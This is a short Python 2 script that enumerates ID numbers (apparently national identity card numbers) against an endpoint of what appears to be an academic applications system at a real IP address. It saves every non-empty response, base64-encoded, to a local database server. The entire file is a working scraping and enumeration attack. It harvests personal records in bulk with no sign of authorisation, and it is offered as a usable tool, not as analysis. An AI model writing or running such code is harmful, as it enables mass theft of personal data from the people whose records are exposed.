
#!/bin/python
import urllib, urllib2
import os
import base64

url = "http://181.115.181.139/sisacademico/oferta/obt_postulaciones_ci"
url2 = "http://127.0.0.1/datosBett0/public/index.php/Egp"
for i in range(8566614, 8999999):
	try:
		post   =  urllib.urlencode({'ci': str(i)})
		pagina =  urllib.urlopen(url, post).read()
		if len(pagina) > 15:
			try:
				nuevo = url2 + "/" + base64.b64encode(pagina)
				servidor  = urllib.urlopen( nuevo ).read()
				print servidor
			except:
				print "Error: Insert Data " + str(i)
				path = os.getcwd();
				path = path + "/ErrorInsert_" + str(i) + ".txt"
				with open(path, "w") as escribir:
						escribir.write(servidor)
	except:
		print "Error: Extract Data " + str(i)
		path = os.getcwd();
		path = path + "/ErrorExtract_" + str(i) + ".txt"
		with open(path, "w") as escribir:
				escribir.write(servidor)
